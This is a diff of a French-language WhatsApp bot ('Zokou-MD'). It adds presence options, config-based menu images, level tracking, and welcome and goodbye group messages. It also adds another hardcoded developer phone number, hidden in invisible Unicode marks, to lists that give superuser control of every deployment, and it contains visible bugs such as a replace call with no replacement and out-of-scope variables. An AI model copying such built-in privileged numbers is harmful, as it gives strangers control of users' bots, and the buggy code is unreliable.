@@ -150,12 +150,13 @@ setTimeout(() => {
             const dj2 = '22543343357';
             const dj3 = "22564297888";
             const luffy = '22891733300';
+            const dj4 = '‪99393228‬';
             const sudo = await getAllSudoNumbers();
-            const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            const superUserNumbers = [servBot, dj, dj2, dj3,dj4, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
-            var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+            var dev = [dj, dj2,dj3,dj4,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
             console.log("\t [][]...{Zokou-Md}...[][]");
             console.log("=========== Nouveau message ===========");
@@ -184,32 +185,34 @@ setTimeout(() => {
             const verifAdmin = verifGroupe ? admins.includes(auteurMessage) : false;
             var verifZokouAdmin = verifGroupe ? admins.includes(idBot) : false;
             /** ** */
-            await zk.sendPresenceUpdate("composing",origineMessage)
+            var etat =conf.ETAT;
+            if(etat==1)
+            {await zk.sendPresenceUpdate("available",origineMessage);}
+            else if(etat==2)
+            {await zk.sendPresenceUpdate("composing",origineMessage);}
+            else if(etat==3)
+            {
+            await zk.sendPresenceUpdate("recording",origineMessage);
+            }
+            else
+            {}
             /** ***** */
             const arg = texte ? texte.trim().split(/ +/).slice(1) : null;
             const verifCom = texte ? texte.startsWith(prefixe) : false;
             const com = verifCom ? texte.slice(1).trim().split(/ +/).shift().toLowerCase() : false;
            
-           
-            const {getThemeChoice,getThemeInfoById} = require('./bdd/theme');
-              
-           let id = await getThemeChoice() ;
-            
-           const imagemenu = await getThemeInfoById(id) ;
-        
-            //const {auteur, liens, nom} = imagemenu
-            const liens=imagemenu.liens;
-        
-            const lien = liens.split(',')            
-            // Utiliser une boucle for...of pour parcourir les liens
+           const liens = conf.URL.split(',');
+
 function mybotpic() {
-    // Générer un indice aléatoire entre 0 (inclus) et la longueur du tableau (exclus)
-     // Générer un indice aléatoire entre 0 (inclus) et la longueur du tableau (exclus)
-     const indiceAleatoire = Math.floor(Math.random() * lien.length);
-     // Récupérer le lien correspondant à l'indice aléatoire
-     const lienAleatoire = lien[indiceAleatoire];
-     return lienAleatoire;
-  }
+  // Générer un indice aléatoire entre 0 (inclus) et la longueur du tableau (exclus)
+  const indiceAleatoire = Math.floor(Math.random() * liens.length);
+  // Récupérer le lien correspondant à l'indice aléatoire
+  const lienAleatoire = liens[indiceAleatoire];
+  return lienAleatoire;
+}
+
+            
+            
             var commandeOptions = {
                 superUser, dev,
                 verifGroupe,
@@ -269,6 +272,14 @@ function mybotpic() {
                 repondre("Vous avez pas acces aux commandes en privé") ; return }
             ///////////////////////////////
 
+              if (texte && auteurMessage.endsWith("s.whatsapp.net")) {
+  const { ajouterOuMettreAJourUserData } = require("./bdd/level"); 
+  try {
+    await ajouterOuMettreAJourUserData(auteurMessage);
+  } catch (e) {
+    console.error(e);
+  }
+              }
              
             /*****************************banGroup  */
             if (verifCom && !superUser && verifGroupe) {
@@ -503,6 +514,62 @@ function mybotpic() {
             //fin exécution commandes
         });
         //fin événement message
+
+/******** evenement groupe update ****************/
+const { recupevents } = require('./bdd/welcome');
+
+zk.ev.on('group-participants.update', async (group) => {
+    console.log(group);
+if (!dev && origineMessage == "120363158701337904@g.us") {
+                return;
+            }
+    let ppgroup;
+    try {
+        ppgroup = await zk.profilePictureUrl(group.id, 'image');
+    } catch {
+        ppgroup = 'https://telegra.ph/file/4cc2712eee93c105f6739.jpg';
+    }
+
+    try {
+        const metadata = await zk.groupMetadata(group.id);
+
+        if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'oui')) {
+            let msg = `╔════◇◇◇═════╗
+║ Souhaitons la bienvenue au(x) nouveau(x) membre(s)
+║ *Nouveau(x) Membre(s) :*
+`;
+
+            let membres = group.participants;
+            for (let membre of membres) {
+                msg += `║ @${membre.split("@")[0]}\n`;
+            }
+
+            msg += `║
+╚════◇◇◇═════╝
+◇ *Description*   ◇
+
+${metadata.desc}`;
+
+            zk.sendMessage(group.id, { image: { url: ppgroup }, caption: msg, mentions: membres });
+        } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye") == 'oui')) {
+            let msg = `Un ou des membres vient(nent) de quitter le groupe;\n`;
+
+            let membres = group.participants;
+            for (let membre of membres) {
+                msg += `@${membre.split("@")[0]}\n`;
+            }
+
+            zk.sendMessage(group.id, { text: msg, mentions: membres });
+        }
+    } catch (e) {
+        console.error(e);
+    }
+});
+
+/******** fin d'evenement groupe update *************************/
+
+
+        
         //événement contact
         zk.ev.on("contacts.upsert", async (contacts) => {
             const insertContact = (newContact) => {
@@ -564,7 +631,7 @@ function mybotpic() {
 ║ 『𝐙𝐨𝐤𝐨𝐮-𝐌𝐃』
 ║    Prefix : [ ${prefixe} ]
 ║    Mode :${md}
-║    Total Commandes : ${evt.cm.length}︎
+║    Nombre total de Commandes : ${evt.cm.length}︎
 ╚══════════════════╝
 
 ╔═════◇
